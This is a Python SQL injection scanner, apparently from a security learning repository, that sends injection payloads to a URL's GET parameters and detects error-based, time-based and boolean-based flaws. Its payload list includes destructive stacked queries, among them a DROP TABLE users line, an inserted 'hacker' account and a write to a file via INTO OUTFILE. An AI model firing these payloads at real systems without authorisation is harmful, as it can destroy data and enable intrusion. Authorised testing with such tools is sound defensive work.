

#!/usr/bin/env python3
"""
SQL Injection Detector
Location: 02-web-application-security/sql-injection/detection/sql_injection_detector.py

This script detects SQL injection vulnerabilities in web applications by
testing various payloads and analyzing responses.
"""

import requests
import argparse
from urllib.parse import urlparse, parse_qs, urljoin
import time
import re
from concurrent.futures import ThreadPoolExecutor
import json
from datetime import datetime
import sys
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

class SQLInjectionDetector:
    def __init__(self, target_url, method='GET', threads=5, timeout=10, cookie=None, proxy=None):
        """
        Initialize SQL Injection Detector
        
        Args:
            target_url: Target URL to test
            method: HTTP method (GET/POST)
            threads: Number of threads for concurrent testing
            timeout: Request timeout in seconds
            cookie: Session cookie for authenticated testing
            proxy: Proxy server for requests
        """
        self.target_url = target_url
        self.method = method.upper()
        self.threads = threads
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        
        # Setup session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner - Educational Purpose)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})
        
        # SQL injection payloads
        self.payloads = [
            # Error-based payloads
            "'",
            '"',
            "')",
            '"))',
            "';",
            "--",
            "#",
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' OR '1'='1'--",
            '" OR "1"="1"--',
            "' OR 1=1#",
            '" OR 1=1#',
            "' UNION SELECT NULL--",
            '" UNION SELECT NULL--',
            "' AND 1=1--",
            '" AND 1=1--',
            "' AND 1=2--",
            '" AND 1=2--',
            
            # Union-based payloads
            "' UNION SELECT 1,2,3--",
            '" UNION SELECT 1,2,3--',
            "' UNION SELECT @@version,2,3--",
            "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            
            # Boolean-based blind
            "' AND '1'='1",
            "' AND '1'='2",
            "' OR '1'='1' AND '1'='1",
            "' OR '1'='1' AND '1'='2",
            
            # Time-based blind
            "' OR SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','password')--",
            
            # Database-specific
            "' AND 1=1 AND 'a'='a",
            "' AND 1=2 AND 'a'='a",
            "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
        ]
        
        # SQL error patterns
        self.error_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that corresponds to your MySQL server",
                r"Unknown column '[^']+' in 'where clause'",
                r"You have an error in your SQL syntax",
                r"Division by 0",
            ],
            'PostgreSQL': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"PG::SyntaxError",
                r"ERROR:  syntax error at or near",
                r"ERROR:  operator does not exist",
            ],
            'Oracle': [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"ORA-00933: SQL command not properly ended",
                r"ORA-01756: quoted string not properly terminated",
            ],
            'SQLite': [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*",
                r"valid SQLite",
                r"unrecognized token",
            ],
            'SQL Server': [
                r"SQL Server.*Driver",
                r"Driver.*SQL Server",
                r"SQLServer JDBC Driver",
                r"com.microsoft.sqlserver",
                r"Unclosed quotation mark",
                r"Microsoft OLE DB Provider for ODBC Drivers",
                r"Incorrect syntax near",
            ],
            'General': [
                r"SQL syntax",
                r"mysql_fetch",
                r"mysql_num_rows",
                r"mysql_error",
                r"mysqli_error",
                r"PDOException",
                r"Database.*error",
                r"DB::Error",
                r"\[SQL Server\]",
                r"Dynamic SQL Error",
                r"Syntax error",
                r"Unclosed quotation mark",
            ]
        }
        
        # Results storage
        self.results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': False,
            'parameters': [],
            'vulnerabilities': [],
            'database_type': None,
            'summary': {}
        }
        
    def extract_parameters(self):
        """Extract parameters from URL for GET requests"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        parameter_list = []
        for param_name, param_value in params.items():
            parameter_list.append({
                'name': param_name,
                'value': param_value[0] if param_value else '',
                'type': 'GET'
            })
        
        return parameter_list
    
    def test_parameter(self, base_url, param_name, original_value, param_type='GET'):
        """Test a single parameter for SQL injection"""
        vulnerabilities = []
        
        print(f"\n{Fore.CYAN}[*] Testing parameter: {param_name} ({param_type}){Style.RESET_ALL}")
        
        # Get original response for baseline
        try:
            original_response = self.make_request(base_url, param_name, original_value, param_type)
            original_length = len(original_response.text) if original_response else 0
            original_time = original_response.elapsed.total_seconds() if original_response else 0
        except Exception as e:
            print(f"{Fore.YELLOW}  [!] Error getting baseline: {e}{Style.RESET_ALL}")
            return []
        
        # Test each payload
        for i, payload in enumerate(self.payloads):
            test_value = str(original_value) + payload
            
            try:
                # Make request with payload
                start_time = time.time()
                response = self.make_request(base_url, param_name, test_value, param_type)
                response_time = time.time() - start_time
                
                if not response:
                    continue
                
                # Check for SQL errors
                db_type, error_matched = self.check_sql_errors(response.text)
                
                if db_type:
                    vulnerability = {
                        'parameter': param_name,
                        'payload': payload,
                        'database': db_type,
                        'error': error_matched,
                        'response_code': response.status_code,
                        'response_length': len(response.text),
                        'response_time': response_time
                    }
                    vulnerabilities.append(vulnerability)
                    
                    print(f"{Fore.RED}  [!] SQL Injection detected!{Style.RESET_ALL}")
                    print(f"      Payload: {payload}")
                    print(f"      Database: {db_type}")
                    print(f"      Error: {error_matched}")
                    
                    # Update results
                    self.results['vulnerable'] = True
                    self.results['database_type'] = db_type
                
                # Check for blind time-based injection
                elif any(x in payload.lower() for x in ['sleep', 'waitfor', 'delay']):
                    if response_time > 5:  # If response took > 5 seconds
                        vulnerability = {
                            'parameter': param_name,
                            'payload': payload,
                            'database': 'Time-based Blind',
                            'error': f'Response time: {response_time:.2f}s',
                            'response_code': response.status_code,
                            'response_length': len(response.text),
                            'response_time': response_time
                        }
                        vulnerabilities.append(vulnerability)
                        
                        print(f"{Fore.RED}  [!] Time-based SQL Injection detected!{Style.RESET_ALL}")
                        print(f"      Payload: {payload}")
                        print(f"      Response time: {response_time:.2f}s")
                        
                        self.results['vulnerable'] = True
                
                # Check for boolean-based blind
                elif '1=1' in payload or '1=2' in payload:
                    length_diff = abs(len(response.text) - original_length)
                    if length_diff > 100:  # Significant difference in response length
                        vulnerability = {
                            'parameter': param_name,
                            'payload': payload,
                            'database': 'Boolean-based Blind',
                            'error': f'Response length difference: {length_diff} bytes',
                            'response_code': response.status_code,
                            'response_length': len(response.text),
                            'response_time': response_time
                        }
                        vulnerabilities.append(vulnerability)
                        
                        print(f"{Fore.RED}  [!] Boolean-based SQL Injection detected!{Style.RESET_ALL}")
                        print(f"      Payload: {payload}")
                        print(f"      Length difference: {length_diff} bytes")
                        
                        self.results['vulnerable'] = True
                
                # Progress indicator
                if (i + 1) % 10 == 0:
                    print(f"{Fore.CYAN}  [*] Tested {i + 1}/{len(self.payloads)} payloads{Style.RESET_ALL}")
                    
            except requests.exceptions.Timeout:
                print(f"{Fore.YELLOW}  [!] Timeout for payload: {payload}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}  [!] Error testing payload {payload}: {e}{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def make_request(self, base_url, param_name, param_value, param_type='GET'):
        """Make HTTP request with parameter"""
        try:
            if param_type == 'GET':
                # Replace parameter value in URL
                if f"{param_name}=" in base_url:
                    # Parameter exists in URL
                    import re
                    test_url = re.sub(f"{param_name}=[^&]*", f"{param_name}={param_value}", base_url)
                else:
                    # Add parameter to URL
                    separator = '&' if '?' in base_url else '?'
                    test_url = f"{base_url}{separator}{param_name}={param_value}"
                
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                
            elif param_type == 'POST':
                # For POST requests, we'd need to parse form data
                # This is simplified - in reality you'd need to handle different content types
                data = {param_name: param_value}
                response = self.session.post(base_url, data=data, timeout=self.timeout, allow_redirects=True)
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}  [!] Request error: {e}{Style.RESET_ALL}")
            return None
    
    def check_sql_errors(self, response_text):
        """Check response for SQL error messages"""
        response_text_lower = response_text.lower()
        
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text_lower, re.IGNORECASE):
                    return db_type, pattern
        
        return None, None
    
    def scan_get_parameters(self):
        """Scan GET parameters"""
        parameters = self.extract_parameters()
        
        if not parameters:
            print(f"{Fore.YELLOW}[!] No GET parameters found in URL{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.GREEN}[*] Found {len(parameters)} GET parameter(s){Style.RESET_ALL}")
        for param in parameters:
            print(f"    - {param['name']} = {param['value']}")
        
        all_vulnerabilities = []
        
        # Test parameters sequentially or with threads
        if self.threads > 1 and len(parameters) > 1:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for param in parameters:
                    future = executor.submit(
                        self.test_parameter,
                        self.target_url,
                        param['name'],
                        param['value'],
                        'GET'
                    )
                    futures.append(future)
                
                for future in futures:
                    vulnerabilities = future.result()
                    all_vulnerabilities.extend(vulnerabilities)
        else:
            for param in parameters:
                vulnerabilities = self.test_parameter(
                    self.target_url,
                    param['name'],
                    param['value'],
                    'GET'
                )
                all_vulnerabilities.extend(vulnerabilities)
        
        return all_vulnerabilities
    
    def scan(self):
        """Main scanning function"""
        print(f"""
        {Fore.CYAN}╔═══════════════════════════════════════╗
        ║   SQL Injection Vulnerability Scanner  ║
        ║        FOR EDUCATIONAL USE ONLY        ║
        ╚═══════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        print(f"{Fore.GREEN}[*] Target: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] Method: {self.method}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] Timeout: {self.timeout}s{Style.RESET_ALL}")
        
        # Check target availability
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[✓] Target is reachable (Status: {response.status_code}){Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Target is unreachable: {e}{Style.RESET_ALL}")
            return self.results
        
        # Scan based on method
        if self.method == 'GET':
            vulnerabilities = self.scan_get_parameters()
        elif self.method == 'POST':
            print(f"{Fore.YELLOW}[!] POST scanning requires form analysis - implement based on target{Style.RESET_ALL}")
            vulnerabilities = []
        else:
            print(f"{Fore.RED}[!] Unsupported method: {self.method}{Style.RESET_ALL}")
            return self.results
        
        # Update results
        self.results['vulnerabilities'] = vulnerabilities
        
        # Generate summary
        self.generate_summary()
        
        return self.results
    
    def generate_summary(self):
        """Generate scan summary"""
        summary = {
            'total_parameters_tested': len(self.extract_parameters()),
            'total_vulnerabilities_found': len(self.results['vulnerabilities']),
            'vulnerable_parameters': list(set([v['parameter'] for v in self.results['vulnerabilities']])),
            'database_types': list(set([v['database'] for v in self.results['vulnerabilities'] if 'database' in v])),
        }
        
        self.results['summary'] = summary
    
    def print_report(self):
        """Print detailed report"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN REPORT{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}Target: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Timestamp: {self.results['timestamp']}{Style.RESET_ALL}")
        
        if self.results['vulnerable']:
            print(f"\n{Fore.RED}[!] VULNERABILITIES DETECTED!{Style.RESET_ALL}")
            print(f"{Fore.RED}    Database Type: {self.results['database_type']}{Style.RESET_ALL}")
            
            print(f"\n{Fore.YELLOW}Vulnerable Parameters:{Style.RESET_ALL}")
            for param in self.results['summary']['vulnerable_parameters']:
                print(f"  - {param}")
            
            print(f"\n{Fore.YELLOW}Detailed Findings:{Style.RESET_ALL}")
            for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                print(f"\n  {i}. Parameter: {vuln['parameter']}")
                print(f"     Payload: {vuln['payload']}")
                print(f"     Database: {vuln.get('database', 'Unknown')}")
                print(f"     Error: {vuln.get('error', 'N/A')}")
                print(f"     Response Time: {vuln.get('response_time', 0):.2f}s")
        else:
            print(f"\n{Fore.GREEN}[✓] No SQL injection vulnerabilities detected.{Style.RESET_ALL}")
            print(f"    Remember: This doesn't guarantee 100% security.")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Summary:{Style.RESET_ALL}")
        print(f"  Parameters tested: {self.results['summary']['total_parameters_tested']}")
        print(f"  Vulnerabilities found: {self.results['summary']['total_vulnerabilities_found']}")
        
    def save_results(self, output_file):
        """Save results to JSON file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"{Fore.GREEN}[✓] Results saved to {output_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Error saving results: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--cookie', help='Session cookie (format: "name=value")')
    parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    
    args = parser.parse_args()
    
    # Confirm legal use
    print(f"\n{Fore.YELLOW}[?] Do you have permission to test this target? (yes/no): {Style.RESET_ALL}", end='')
    response = input().lower()
    
    if response != 'yes':
        print(f"{Fore.RED}[!] Exiting. Only test systems you own or have permission to test.{Style.RESET_ALL}")
        return
    
    # Create scanner instance
    scanner = SQLInjectionDetector(
        target_url=args.url,
        method=args.method,
        threads=args.threads,
        timeout=args.timeout,
        cookie=args.cookie,
        proxy=args.proxy
    )
    
    try:
        # Run scan
        results = scanner.scan()
        
        # Print report
        scanner.print_report()
        
        # Save results if output file specified
        if args.output:
            scanner.save_results(args.output)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
